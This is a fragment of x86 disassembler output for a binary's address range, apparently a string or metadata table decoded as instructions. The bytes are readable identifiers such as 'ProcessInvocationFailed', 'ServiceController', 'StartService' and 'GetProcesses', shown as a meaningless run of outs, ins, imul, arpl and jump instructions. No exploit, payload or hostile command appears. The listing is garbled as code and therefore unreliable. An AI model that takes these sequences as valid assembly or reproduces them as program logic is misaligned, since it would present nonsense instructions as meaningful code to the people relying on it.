  406317:	imul   sp,WORD PTR [edi+0x0],0x6567
  40631d:	je     0x40637e
  40631f:	inc    ebx
  406320:	outs   dx,DWORD PTR ds:[esi]
  406321:	outs   dx,BYTE PTR ds:[esi]
  406322:	imul   sp,WORD PTR [edi+0x0],0x6573
  406328:	je     0x406389
  40632a:	inc    ebx
  40632b:	outs   dx,DWORD PTR ds:[esi]
  40632c:	outs   dx,BYTE PTR ds:[esi]
  40632d:	imul   sp,WORD PTR [edi+0x0],0x6567
  406333:	je     0x406394
  406335:	dec    ecx
  406336:	jae    0x40638d
  406338:	jae    0x40639f
  40633a:	jb     0x40638c
  40633c:	jb     0x4063ad
  40633e:	jbe    0x4063a9
  406340:	fs gs fs inc ebx
  406344:	outs   dx,DWORD PTR ds:[esi]
  406345:	outs   dx,BYTE PTR ds:[esi]
  406346:	imul   sp,WORD PTR [edi+0x0],0x6573
  40634c:	je     0x4063ad
  40634e:	dec    ecx
  40634f:	jae    0x4063a6
  406351:	jae    0x4063b8
  406353:	jb     0x4063a5
  406355:	jb     0x4063c6
  406357:	jbe    0x4063c2
  406359:	fs gs fs inc ebx
  40635d:	outs   dx,DWORD PTR ds:[esi]
  40635e:	outs   dx,BYTE PTR ds:[esi]
  40635f:	imul   sp,WORD PTR [edi+0x0],0x6567
  406365:	je     0x4063c6
  406367:	push   eax
  406368:	popa   
  406369:	jb     0x4063cc
  40636b:	ins    DWORD PTR es:[edi],dx
  40636c:	gs je  0x4063d4
  40636f:	jb     0x4063c1
  406371:	jb     0x4063d8
  406373:	imul   di,WORD PTR [eax+0x43],0x6168
  406379:	jb     0x40637b
  40637b:	push   esp
  40637c:	jb     0x4063f7
  40637e:	inc    ebx
  40637f:	jb     0x4063e6
  406381:	popa   
  406382:	je     0x4063e9
  406384:	dec    edi
  406385:	jne    0x4063fb
  406387:	inc    esp
  406388:	imul   esi,DWORD PTR [edx+0x0],0x50746553
  40638f:	jb     0x406400
  406391:	jo     0x4063f8
  406393:	jb     0x406409
  406395:	imul   esp,DWORD PTR [ebp+0x73],0x74654700
  40639c:	inc    esp
  40639d:	gs popaw 
  4063a0:	jne    0x40640e
  4063a2:	je     0x4063e7
  4063a4:	outs   dx,DWORD PTR ds:[esi]
  4063a5:	outs   dx,BYTE PTR ds:[esi]
  4063a6:	imul   sp,WORD PTR [edi+0x0],0x7254
  4063ac:	jns    0x4063fe
  4063ae:	popa   
  4063af:	jb     0x406424
  4063b1:	gs dec esi
  4063b3:	outs   dx,DWORD PTR ds:[esi]
  4063b4:	outs   dx,BYTE PTR ds:[esi]
  4063b5:	inc    ebp
  4063b6:	ins    DWORD PTR es:[edi],dx
  4063b7:	jo     0x40642d
  4063b9:	jns    0x40640e
  4063bb:	je     0x40642f
  4063bd:	imul   ebp,DWORD PTR [esi+0x67],0x79725400
  4063c4:	push   eax
  4063c5:	popa   
  4063c6:	jb     0x40643b
  4063c8:	gs push eax
  4063ca:	jb     0x40643b
  4063cc:	arpl   WORD PTR [ebp+0x73],sp
  4063cf:	jae    0x406412
  4063d1:	jb     0x40643a
  4063d3:	jne    0x406442
  4063d5:	outs   dx,BYTE PTR gs:[esi]
  4063d7:	je     0x4063d9
  4063d9:	push   esp
  4063da:	jb     0x406455
  4063dc:	push   eax
  4063dd:	popa   
  4063de:	jb     0x406453
  4063e0:	gs inc ebx
  4063e2:	outs   dx,DWORD PTR ds:[esi]
  4063e3:	outs   dx,BYTE PTR ds:[esi]
  4063e4:	imul   sp,WORD PTR [edi+0x0],0x7254
  4063ea:	jns    0x40643c
  4063ec:	popa   
  4063ed:	jb     0x406462
  4063ef:	gs dec edi
  4063f1:	jne    0x406467
  4063f3:	inc    esp
  4063f4:	imul   esi,DWORD PTR [edx+0x0],0x43746547
  4063fb:	outs   dx,DWORD PTR ds:[esi]
  4063fc:	ins    BYTE PTR es:[edi],dx
  4063fd:	ins    BYTE PTR es:[edi],dx
  4063fe:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406403:	outs   dx,BYTE PTR ds:[esi]
  406404:	inc    ebx
  406405:	outs   dx,DWORD PTR ds:[esi]
  406406:	ins    DWORD PTR es:[edi],dx
  406407:	ins    DWORD PTR es:[edi],dx
  406408:	popa   
  406409:	outs   dx,BYTE PTR ds:[esi]
  40640a:	add    BYTE PTR fs:[esi+0x61],dl
  40640e:	ins    BYTE PTR es:[edi],dx
  40640f:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x72615065
  406417:	popa   
  406418:	ins    DWORD PTR es:[edi],dx
  406419:	gs je  0x406481
  40641c:	jb     0x406462
  40641e:	gs jo  0x406486
  406421:	outs   dx,BYTE PTR ds:[esi]
  406422:	fs outs dx,BYTE PTR gs:[esi]
  406425:	arpl   WORD PTR [ecx+0x65],bp
  406428:	jae    0x40642a
  40642a:	inc    ebx
  40642b:	outs   dx,DWORD PTR ds:[esi]
  40642c:	jne    0x40649c
  40642e:	je     0x406475
  406430:	outs   dx,BYTE PTR ds:[esi]
  406431:	popa   
  406432:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  406436:	inc    ebx
  406437:	outs   dx,DWORD PTR ds:[esi]
  406438:	ins    DWORD PTR es:[edi],dx
  406439:	ins    DWORD PTR es:[edi],dx
  40643a:	popa   
  40643b:	outs   dx,BYTE PTR ds:[esi]
  40643c:	fs jae 0x40643f
  40643f:	cmp    al,0x43
  406441:	outs   dx,DWORD PTR ds:[esi]
  406442:	ins    DWORD PTR es:[edi],dx
  406443:	ins    DWORD PTR es:[edi],dx
  406444:	popa   
  406445:	outs   dx,BYTE PTR ds:[esi]
  406446:	fs imul ebx,DWORD PTR ds:[edi+0x5f],0x42
  40644c:	popa   
  40644d:	arpl   WORD PTR [ebx+0x69],bp
  406450:	outs   dx,BYTE PTR ds:[esi]
  406451:	addr16 inc esi
  406453:	imul   esp,DWORD PTR [ebp+0x6c],0x433c0064
  40645a:	outs   dx,DWORD PTR ds:[esi]
  40645b:	ins    BYTE PTR es:[edi],dx
  40645c:	ins    BYTE PTR es:[edi],dx
  40645d:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406462:	outs   dx,BYTE PTR ds:[esi]
  406463:	push   eax
  406464:	popa   
  406465:	jb     0x4064c8
  406467:	ins    DWORD PTR es:[edi],dx
  406468:	gs je  0x4064d0
  40646b:	jb     0x4064b2
  40646d:	jb     0x4064e1
  40646f:	outs   dx,DWORD PTR ds:[esi]
  406470:	jb     0x4064e5
  406472:	imul   ebx,DWORD PTR ds:[edi+0x5f],0x42
  406477:	popa   
  406478:	arpl   WORD PTR [ebx+0x69],bp
  40647b:	outs   dx,BYTE PTR ds:[esi]
  40647c:	addr16 inc esi
  40647e:	imul   esp,DWORD PTR [ebp+0x6c],0x473c0064
  406485:	outs   dx,BYTE PTR gs:[esi]
  406487:	gs jb  0x4064eb
  40648a:	ins    BYTE PTR es:[edi],dx
  40648b:	push   eax
  40648c:	popa   
  40648d:	jb     0x406502
  40648f:	imul   ebp,DWORD PTR [esi+0x67],0x6f727245
  406496:	jb     0x40650b
  406498:	imul   ebx,DWORD PTR ds:[edi+0x5f],0x42
  40649d:	popa   
  40649e:	arpl   WORD PTR [ebx+0x69],bp
  4064a1:	outs   dx,BYTE PTR ds:[esi]
  4064a2:	addr16 inc esi
  4064a4:	imul   esp,DWORD PTR [ebp+0x6c],0x493c0064
  4064ab:	jae    0x4064fe
  4064ad:	jne    0x406514
  4064af:	jb     0x40652a
  4064b1:	inc    ebx
  4064b2:	outs   dx,DWORD PTR ds:[esi]
  4064b3:	ins    DWORD PTR es:[edi],dx
  4064b4:	ins    DWORD PTR es:[edi],dx
  4064b5:	popa   
  4064b6:	outs   dx,BYTE PTR ds:[esi]
  4064b7:	fs imul ebx,DWORD PTR ds:[edi+0x5f],0x42
  4064bd:	popa   
  4064be:	arpl   WORD PTR [ebx+0x69],bp
  4064c1:	outs   dx,BYTE PTR ds:[esi]
  4064c2:	addr16 inc esi
  4064c4:	imul   esp,DWORD PTR [ebp+0x6c],0x493c0064
  4064cb:	jae    0x406511
  4064cd:	gs je  0x406531
  4064d0:	arpl   WORD PTR [eax+0x43],bp
  4064d3:	outs   dx,DWORD PTR ds:[esi]
  4064d4:	ins    DWORD PTR es:[edi],dx
  4064d5:	ins    DWORD PTR es:[edi],dx
  4064d6:	popa   
  4064d7:	outs   dx,BYTE PTR ds:[esi]
  4064d8:	fs imul ebx,DWORD PTR ds:[edi+0x5f],0x42
  4064de:	popa   
  4064df:	arpl   WORD PTR [ebx+0x69],bp
  4064e2:	outs   dx,BYTE PTR ds:[esi]
  4064e3:	addr16 inc esi
  4064e5:	imul   esp,DWORD PTR [ebp+0x6c],0x493c0064
  4064ec:	jae    0x40653a
  4064ee:	popa   
  4064ef:	jne    0x40655f
  4064f1:	arpl   WORD PTR [eax+0x43],bp
  4064f4:	outs   dx,DWORD PTR ds:[esi]
  4064f5:	ins    DWORD PTR es:[edi],dx
  4064f6:	ins    DWORD PTR es:[edi],dx
  4064f7:	popa   
  4064f8:	outs   dx,BYTE PTR ds:[esi]
  4064f9:	fs imul ebx,DWORD PTR ds:[edi+0x5f],0x42
  4064ff:	popa   
  406500:	arpl   WORD PTR [ebx+0x69],bp
  406503:	outs   dx,BYTE PTR ds:[esi]
  406504:	addr16 inc esi
  406506:	imul   esp,DWORD PTR [ebp+0x6c],0x493c0064
  40650d:	jae    0x406550
  40650f:	je     0x406585
  406511:	popa   
  406512:	arpl   WORD PTR [eax+0x43],bp
  406515:	outs   dx,DWORD PTR ds:[esi]
  406516:	ins    DWORD PTR es:[edi],dx
  406517:	ins    DWORD PTR es:[edi],dx
  406518:	popa   
  406519:	outs   dx,BYTE PTR ds:[esi]
  40651a:	fs imul ebx,DWORD PTR ds:[edi+0x5f],0x42
  406520:	popa   
  406521:	arpl   WORD PTR [ebx+0x69],bp
  406524:	outs   dx,BYTE PTR ds:[esi]
  406525:	addr16 inc esi
  406527:	imul   esp,DWORD PTR [ebp+0x6c],0x493c0064
  40652e:	jae    0x406571
  406530:	outs   dx,BYTE PTR ds:[esi]
  406531:	popa   
  406532:	ins    BYTE PTR es:[edi],dx
  406533:	jns    0x4065af
  406535:	gs inc ebx
  406537:	outs   dx,DWORD PTR ds:[esi]
  406538:	ins    DWORD PTR es:[edi],dx
  406539:	ins    DWORD PTR es:[edi],dx
  40653a:	popa   
  40653b:	outs   dx,BYTE PTR ds:[esi]
  40653c:	fs imul ebx,DWORD PTR ds:[edi+0x5f],0x42
  406542:	popa   
  406543:	arpl   WORD PTR [ebx+0x69],bp
  406546:	outs   dx,BYTE PTR ds:[esi]
  406547:	addr16 inc esi
  406549:	imul   esp,DWORD PTR [ebp+0x6c],0x4c3c0064
  406550:	popa   
  406551:	jne    0x4065c1
  406553:	arpl   WORD PTR [eax+0x45],bp
  406556:	js     0x4065bd
  406558:	imul   ebx,DWORD PTR ds:[edi+0x5f],0x42
  40655d:	popa   
  40655e:	arpl   WORD PTR [ebx+0x69],bp
  406561:	outs   dx,BYTE PTR ds:[esi]
  406562:	addr16 inc esi
  406564:	imul   esp,DWORD PTR [ebp+0x6c],0x4c3c0064
  40656b:	popa   
  40656c:	jne    0x4065dc
  40656e:	arpl   WORD PTR [eax+0x41],bp
  406571:	jb     0x4065da
  406573:	jae    0x4065b3
  406575:	imul   ebx,DWORD PTR [edi+0x5f],0x42
  406579:	popa   
  40657a:	arpl   WORD PTR [ebx+0x69],bp
  40657d:	outs   dx,BYTE PTR ds:[esi]
  40657e:	addr16 inc esi
  406580:	imul   esp,DWORD PTR [ebp+0x6c],0x503c0064
  406587:	jb     0x4065f8
  406589:	arpl   WORD PTR [ebp+0x73],sp
  40658c:	jae    0x4065cf
  40658e:	jb     0x4065f7
  406590:	imul   ebx,DWORD PTR ds:[edi+0x5f],0x42
  406595:	popa   
  406596:	arpl   WORD PTR [ebx+0x69],bp
  406599:	outs   dx,BYTE PTR ds:[esi]
  40659a:	addr16 inc esi
  40659c:	imul   esp,DWORD PTR [ebp+0x6c],0x413c0064
  4065a3:	outs   dx,BYTE PTR ds:[esi]
  4065a4:	popa   
  4065a5:	ins    BYTE PTR es:[edi],dx
  4065a6:	jns    0x406622
  4065a8:	gs push esp
  4065aa:	jb     0x40660d
  4065ac:	arpl   WORD PTR [ebp+0x46],sp
  4065af:	imul   ebp,DWORD PTR [ebp+eiz*2+0x3e],0x425f5f6b
  4065b7:	popa   
  4065b8:	arpl   WORD PTR [ebx+0x69],bp
  4065bb:	outs   dx,BYTE PTR ds:[esi]
  4065bc:	addr16 inc esi
  4065be:	imul   esp,DWORD PTR [ebp+0x6c],0x4f3c0064
  4065c5:	jne    0x40663b
  4065c7:	jo     0x40663e
  4065c9:	je     0x40660f
  4065cb:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4065d2:	jns    0x406612
  4065d4:	imul   ebx,DWORD PTR [edi+0x5f],0x42
  4065d8:	popa   
  4065d9:	arpl   WORD PTR [ebx+0x69],bp
  4065dc:	outs   dx,BYTE PTR ds:[esi]
  4065dd:	addr16 inc esi
  4065df:	imul   esp,DWORD PTR [ebp+0x6c],0x433c0064
  4065e6:	outs   dx,DWORD PTR ds:[esi]
  4065e7:	outs   dx,BYTE PTR ds:[esi]
  4065e8:	imul   sp,WORD PTR [edi+0x3e],0x5f6b
  4065ee:	pop    edi
  4065ef:	inc    edx
  4065f0:	popa   
  4065f1:	arpl   WORD PTR [ebx+0x69],bp
  4065f4:	outs   dx,BYTE PTR ds:[esi]
  4065f5:	addr16 inc esi
  4065f7:	imul   esp,DWORD PTR [ebp+0x6c],0x493c0064
  4065fe:	jae    0x406655
  406600:	jae    0x406667
  406602:	jb     0x406654
  406604:	jb     0x406675
  406606:	jbe    0x406671
  406608:	fs gs fs inc ebx
  40660c:	outs   dx,DWORD PTR ds:[esi]
  40660d:	outs   dx,BYTE PTR ds:[esi]
  40660e:	imul   sp,WORD PTR [edi+0x3e],0x5f6b
  406614:	pop    edi
  406615:	inc    edx
  406616:	popa   
  406617:	arpl   WORD PTR [ebx+0x69],bp
  40661a:	outs   dx,BYTE PTR ds:[esi]
  40661b:	addr16 inc esi
  40661d:	imul   esp,DWORD PTR [ebp+0x6c],0x6f430064
  406624:	ins    DWORD PTR es:[edi],dx
  406625:	ins    DWORD PTR es:[edi],dx
  406626:	popa   
  406627:	outs   dx,BYTE PTR ds:[esi]
  406628:	add    BYTE PTR fs:[ebx+0x6f],al
  40662c:	ins    BYTE PTR es:[edi],dx
  40662d:	ins    BYTE PTR es:[edi],dx
  40662e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406633:	outs   dx,BYTE PTR ds:[esi]
  406634:	push   eax
  406635:	popa   
  406636:	jb     0x406699
  406638:	ins    DWORD PTR es:[edi],dx
  406639:	gs je  0x4066a1
  40663c:	jb     0x406683
  40663e:	jb     0x4066b2
  406640:	outs   dx,DWORD PTR ds:[esi]
  406641:	jb     0x4066b6
  406643:	add    BYTE PTR [edi+0x65],al
  406646:	outs   dx,BYTE PTR ds:[esi]
  406647:	gs jb  0x4066ab
  40664a:	ins    BYTE PTR es:[edi],dx
  40664b:	push   eax
  40664c:	popa   
  40664d:	jb     0x4066c2
  40664f:	imul   ebp,DWORD PTR [esi+0x67],0x6f727245
  406656:	jb     0x4066cb
  406658:	add    BYTE PTR [ecx+0x73],cl
  40665b:	push   ecx
  40665c:	jne    0x4066c3
  40665e:	jb     0x4066d9
  406660:	inc    ebx
  406661:	outs   dx,DWORD PTR ds:[esi]
  406662:	ins    DWORD PTR es:[edi],dx
  406663:	ins    DWORD PTR es:[edi],dx
  406664:	popa   
  406665:	outs   dx,BYTE PTR ds:[esi]
  406666:	add    BYTE PTR fs:[ecx+0x73],cl
  40666a:	inc    esp
  40666b:	gs je  0x4066cf
  40666e:	arpl   WORD PTR [eax+0x43],bp
  406671:	outs   dx,DWORD PTR ds:[esi]
  406672:	ins    DWORD PTR es:[edi],dx
  406673:	ins    DWORD PTR es:[edi],dx
  406674:	popa   
  406675:	outs   dx,BYTE PTR ds:[esi]
  406676:	add    BYTE PTR fs:[ecx+0x73],cl
  40667a:	dec    esp
  40667b:	popa   
  40667c:	jne    0x4066ec
  40667e:	arpl   WORD PTR [eax+0x43],bp
  406681:	outs   dx,DWORD PTR ds:[esi]
  406682:	ins    DWORD PTR es:[edi],dx
  406683:	ins    DWORD PTR es:[edi],dx
  406684:	popa   
  406685:	outs   dx,BYTE PTR ds:[esi]
  406686:	add    BYTE PTR fs:[ecx+0x73],cl
  40668a:	inc    ecx
  40668b:	je     0x406701
  40668d:	popa   
  40668e:	arpl   WORD PTR [eax+0x43],bp
  406691:	outs   dx,DWORD PTR ds:[esi]
  406692:	ins    DWORD PTR es:[edi],dx
  406693:	ins    DWORD PTR es:[edi],dx
  406694:	popa   
  406695:	outs   dx,BYTE PTR ds:[esi]
  406696:	add    BYTE PTR fs:[ecx+0x73],cl
  40669a:	inc    ecx
  40669b:	outs   dx,BYTE PTR ds:[esi]
  40669c:	popa   
  40669d:	ins    BYTE PTR es:[edi],dx
  40669e:	jns    0x40671a
  4066a0:	gs inc ebx
  4066a2:	outs   dx,DWORD PTR ds:[esi]
  4066a3:	ins    DWORD PTR es:[edi],dx
  4066a4:	ins    DWORD PTR es:[edi],dx
  4066a5:	popa   
  4066a6:	outs   dx,BYTE PTR ds:[esi]
  4066a7:	add    BYTE PTR fs:[ecx+eiz*2+0x75],cl
  4066ac:	outs   dx,BYTE PTR ds:[esi]
  4066ad:	arpl   WORD PTR [eax+0x45],bp
  4066b0:	js     0x406717
  4066b2:	add    BYTE PTR [ecx+eiz*2+0x75],cl
  4066b6:	outs   dx,BYTE PTR ds:[esi]
  4066b7:	arpl   WORD PTR [eax+0x41],bp
  4066ba:	jb     0x406723
  4066bc:	jae    0x4066be
  4066be:	push   eax
  4066bf:	jb     0x406730
  4066c1:	arpl   WORD PTR [ebp+0x73],sp
  4066c4:	jae    0x406707
  4066c6:	jb     0x40672f
  4066c8:	add    BYTE PTR [ecx+0x6e],al
  4066cb:	popa   
  4066cc:	ins    BYTE PTR es:[edi],dx
  4066cd:	jns    0x406749
  4066cf:	gs push esp
  4066d1:	jb     0x406734
  4066d3:	arpl   WORD PTR [ebp+0x46],sp
  4066d6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x7074754f
  4066de:	jne    0x406754
  4066e0:	inc    esp
  4066e1:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4066e8:	jns    0x4066ea
  4066ea:	inc    ebx
  4066eb:	outs   dx,DWORD PTR ds:[esi]
  4066ec:	outs   dx,BYTE PTR ds:[esi]
  4066ed:	imul   sp,WORD PTR [edi+0x0],0x7349
  4066f3:	push   ebp
  4066f4:	jae    0x40675b
  4066f6:	jb     0x406748
  4066f8:	jb     0x406769
  4066fa:	jbe    0x406765
  4066fc:	fs gs fs inc ebx
  406700:	outs   dx,DWORD PTR ds:[esi]
  406701:	outs   dx,BYTE PTR ds:[esi]
  406702:	imul   sp,WORD PTR [edi+0x0],0x6150
  406708:	jb     0x40676b
  40670a:	ins    DWORD PTR es:[edi],dx
  40670b:	gs je  0x406773
  40670e:	jb     0x406760
  406710:	jb     0x406777
  406712:	imul   di,WORD PTR [eax+0x43],0x6168
  406718:	jb     0x40671a
  40671a:	push   ebx
  40671b:	jne    0x406780
  40671d:	arpl   WORD PTR [ebp+0x73],sp
  406720:	jae    0x406722
  406722:	push   ebp
  406723:	outs   dx,BYTE PTR ds:[esi]
  406724:	popa   
  406725:	jne    0x40679b
  406727:	push   0x7a69726f
  40672c:	gs fs push esp
  40672f:	outs   dx,DWORD PTR ds:[esi]
  406730:	push   ebx
  406731:	je     0x406794
  406733:	jb     0x4067a9
  406735:	inc    ebx
  406736:	outs   dx,DWORD PTR ds:[esi]
  406737:	ins    BYTE PTR es:[edi],dx
  406738:	ins    BYTE PTR es:[edi],dx
  406739:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40673e:	outs   dx,BYTE PTR ds:[esi]
  40673f:	add    BYTE PTR [ebx+0x65],dl
  406742:	jb     0x4067ba
  406744:	imul   esp,DWORD PTR [ebx+0x65],0x746e6143
  40674b:	inc    ebx
  40674c:	outs   dx,DWORD PTR ds:[esi]
  40674d:	outs   dx,BYTE PTR ds:[esi]
  40674e:	outs   dx,BYTE PTR ds:[esi]
  40674f:	arpl   WORD PTR gs:[eax+eax*1+0x43],si
  406754:	outs   dx,DWORD PTR ds:[esi]
  406755:	ins    BYTE PTR es:[edi],dx
  406756:	ins    BYTE PTR es:[edi],dx
  406757:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40675c:	outs   dx,BYTE PTR ds:[esi]
  40675d:	inc    ecx
  40675e:	ins    BYTE PTR es:[edi],dx
  40675f:	jb     0x4067c6
  406761:	popa   
  406762:	fs jns 0x4067ae
  406765:	outs   dx,BYTE PTR ds:[esi]
  406766:	push   eax
  406767:	jb     0x4067d8
  406769:	addr16 jb 0x4067d1
  40676c:	jae    0x4067e1
  40676e:	add    BYTE PTR [ebp+0x6e],dl
  406771:	popa   
  406772:	jne    0x4067e8
  406774:	push   0x7a69726f
  406779:	gs fs inc ecx
  40677c:	arpl   WORD PTR [ebx+0x65],sp
  40677f:	jae    0x4067f4
  406781:	push   esp
  406782:	outs   dx,DWORD PTR ds:[esi]
  406783:	dec    edi
  406784:	jne    0x4067fa
  406786:	jo     0x4067fd
  406788:	je     0x4067ce
  40678a:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  406791:	jns    0x406793
  406793:	push   ebp
  406794:	outs   dx,BYTE PTR ds:[esi]
  406795:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  406799:	outs   dx,BYTE PTR ds:[esi]
  40679a:	inc    ebp
  40679b:	jb     0x40680f
  40679d:	outs   dx,DWORD PTR ds:[esi]
  40679e:	jb     0x4067a0
  4067a0:	push   ecx
  4067a1:	jne    0x406808
  4067a3:	jb     0x40681e
  4067a5:	dec    esi
  4067a6:	outs   dx,DWORD PTR ds:[esi]
  4067a7:	je     0x4067ec
  4067a9:	outs   dx,DWORD PTR ds:[esi]
  4067aa:	ins    BYTE PTR es:[edi],dx
  4067ab:	ins    BYTE PTR es:[edi],dx
  4067ac:	arpl   WORD PTR gs:[ecx+ebp*2+0x6e],si
  4067b1:	add    BYTE PTR [bx+di+0x75],dl
  4067b5:	gs jb  0x406831
  4067b8:	inc    ebx
  4067b9:	outs   dx,DWORD PTR ds:[esi]
  4067ba:	ins    BYTE PTR es:[edi],dx
  4067bb:	ins    BYTE PTR es:[edi],dx
  4067bc:	arpl   WORD PTR gs:[ecx+ebp*2+0x6e],si
  4067c1:	add    BYTE PTR [bx+di+0x75],dl
  4067c5:	gs jb  0x406841
  4067c8:	push   ebx
  4067c9:	gs jae 0x40683f
  4067cc:	imul   ebp,DWORD PTR [edi+0x6e],0x73754273
  4067d3:	jns    0x4067d5
  4067d5:	inc    esp
  4067d6:	gs je  0x40683a
  4067d9:	arpl   WORD PTR [eax+0x46],bp
  4067dc:	popa   
  4067dd:	imul   ebp,DWORD PTR [esi+ecx*2+0x6f],0x6c6f4374
  4067e5:	ins    BYTE PTR es:[edi],dx
  4067e6:	arpl   WORD PTR gs:[ecx+ebp*2+0x6e],si
  4067eb:	add    BYTE PTR [si+0x65],al
  4067ef:	je     0x406852
  4067f1:	arpl   WORD PTR [eax+0x53],bp
  4067f4:	je     0x406865
  4067f6:	jo     0x40683b
  4067f8:	outs   dx,DWORD PTR ds:[esi]
  4067f9:	ins    BYTE PTR es:[edi],dx
  4067fa:	ins    BYTE PTR es:[edi],dx
  4067fb:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406800:	outs   dx,BYTE PTR ds:[esi]
  406801:	inc    esi
  406802:	popa   
  406803:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x75614c00
  40680b:	outs   dx,BYTE PTR ds:[esi]
  40680c:	arpl   WORD PTR [eax+0x46],bp
  40680f:	popa   
  406810:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x746e6143
  406818:	push   ebx
  406819:	je     0x40687c
  40681b:	jb     0x406891
  40681d:	add    BYTE PTR [ecx+0x74],al
  406820:	je     0x406883
  406822:	arpl   WORD PTR [eax+0x46],bp
  406825:	popa   
  406826:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x636f7250
  40682e:	gs jae 0x4068a4
  406831:	dec    ecx
  406832:	outs   dx,BYTE PTR ds:[esi]
  406833:	jbe    0x406896
  406835:	ins    BYTE PTR es:[edi],dx
  406836:	imul   esp,DWORD PTR [eax+eax*1+0x41],0x796c616e
  40683e:	jp     0x4068a5
  406840:	dec    esp
  406841:	imul   esi,DWORD PTR [ebx+0x74],0x73646950
  406848:	add    BYTE PTR [ecx+0x6e],al
  40684b:	popa   
  40684c:	ins    BYTE PTR es:[edi],dx
  40684d:	jns    0x4068c9
  40684f:	gs push eax
  406851:	jb     0x4068c2
  406853:	arpl   WORD PTR [ebp+0x73],sp
  406856:	jae    0x406899
  406858:	jb     0x4068c1
  40685a:	dec    esi
  40685b:	outs   dx,DWORD PTR ds:[esi]
  40685c:	je     0x4068b1
  40685e:	jne    0x4068d0
  406860:	jo     0x4068d1
  406862:	jb     0x4068d8
  406864:	gs fs inc esi
  406867:	outs   dx,DWORD PTR ds:[esi]
  406868:	jb     0x4068be
  40686a:	jb     0x4068cd
  40686c:	arpl   WORD PTR [ebp+0x0],sp
  40686f:	inc    ecx
  406870:	outs   dx,BYTE PTR ds:[esi]
  406871:	popa   
  406872:	ins    BYTE PTR es:[edi],dx
  406873:	jns    0x4068ef
  406875:	gs inc esi
  406877:	popa   
  406878:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x636f7250
  406880:	gs jae 0x4068f6
  406883:	dec    ecx
  406884:	outs   dx,BYTE PTR ds:[esi]
  406885:	jbe    0x4068e8
  406887:	ins    BYTE PTR es:[edi],dx
  406888:	imul   esp,DWORD PTR [eax+eax*1+0x41],0x796c616e
  406890:	jp     0x4068f7
  406892:	inc    esi
  406893:	popa   
  406894:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x61766e49
  40689c:	ins    BYTE PTR es:[edi],dx
  40689d:	imul   esp,DWORD PTR [esp+edx*2+0x72],0x656361
  4068a5:	dec    esi
  4068a6:	jne    0x406914
  4068a8:	ins    BYTE PTR es:[edi],dx
  4068a9:	popa   
  4068aa:	bound  ebp,QWORD PTR [ebp+eiz*2+0x60]
  4068ae:	xor    DWORD PTR [eax],eax
  4068b0:	imul   esp,DWORD PTR [eax+eax*1+0x6e],0x656d61
  4068b8:	addr16 gs je 0x40691b
  4068bc:	dec    ecx
  4068bd:	add    BYTE PTR fs:[edi+0x65],ah
  4068c1:	je     0x406922
  4068c3:	dec    esi
  4068c4:	popa   
  4068c5:	ins    DWORD PTR es:[edi],dx
  4068c6:	add    BYTE PTR gs:[ecx+0x73],cl
  4068ca:	push   esi
  4068cb:	popa   
  4068cc:	ins    BYTE PTR es:[edi],dx
  4068cd:	imul   esp,DWORD PTR [eax+eax*1+0x53],0x65747379
  4068d5:	ins    DWORD PTR es:[edi],dx
  4068d6:	cs inc esp
  4068d8:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  4068df:	imul   esp,DWORD PTR [ebx+0x73],0x6f725000
  4068e6:	arpl   WORD PTR [ebp+0x73],sp
  4068e9:	jae    0x4068eb
  4068eb:	inc    edi
  4068ec:	gs je  0x40693f
  4068ef:	jb     0x406960
  4068f1:	arpl   WORD PTR [ebp+0x73],sp
  4068f4:	jae    0x4068f6
  4068f6:	dec    ecx
  4068f7:	add    BYTE PTR fs:[esi+0x61],cl
  4068fb:	ins    DWORD PTR es:[edi],dx
  4068fc:	add    BYTE PTR gs:[ebx+0x6f],al
  406900:	ins    BYTE PTR es:[edi],dx
  406901:	ins    BYTE PTR es:[edi],dx
  406902:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406907:	outs   dx,BYTE PTR ds:[esi]
  406908:	push   ebx
  406909:	gs jb  0x406982
  40690c:	imul   esp,DWORD PTR [ebx+0x65],0x65696c43
  406913:	outs   dx,BYTE PTR ds:[esi]
  406914:	je     0x406916
  406916:	addr16 gs je 0x406979
  40691a:	inc    ebx
  40691b:	ins    BYTE PTR es:[edi],dx
  40691c:	imul   esp,DWORD PTR [ebp+0x6e],0x65730074
  406923:	je     0x406984
  406925:	inc    ebx
  406926:	ins    BYTE PTR es:[edi],dx
  406927:	imul   esp,DWORD PTR [ebp+0x6e],0x74530074
  40692e:	popa   
  40692f:	jb     0x4069a5
  406931:	push   ebx
  406932:	gs jb  0x4069ab
  406935:	imul   esp,DWORD PTR [ebx+0x65],0x43646e41
  40693c:	jb     0x4069a3
  40693e:	popa   
  40693f:	je     0x4069a6
  406941:	inc    ebx
  406942:	ins    BYTE PTR es:[edi],dx
  406943:	imul   esp,DWORD PTR [ebp+0x6e],0x74530074
  40694a:	outs   dx,DWORD PTR ds:[esi]
  40694b:	jo     0x4069a0
  40694d:	gs jb  0x4069c6
  406950:	imul   esp,DWORD PTR [ebx+0x65],0x43646e41
  406957:	ins    BYTE PTR es:[edi],dx
  406958:	outs   dx,DWORD PTR ds:[esi]
  406959:	jae    0x4069c0
  40695b:	inc    ebx
  40695c:	ins    BYTE PTR es:[edi],dx
  40695d:	imul   esp,DWORD PTR [ebp+0x6e],0x72540074
  406964:	jns    0x4069a9
  406966:	outs   dx,DWORD PTR ds:[esi]
  406967:	outs   dx,BYTE PTR ds:[esi]
  406968:	outs   dx,BYTE PTR ds:[esi]
  406969:	arpl   WORD PTR gs:[esp+edx*2+0x6f],si
  40696e:	inc    ebp
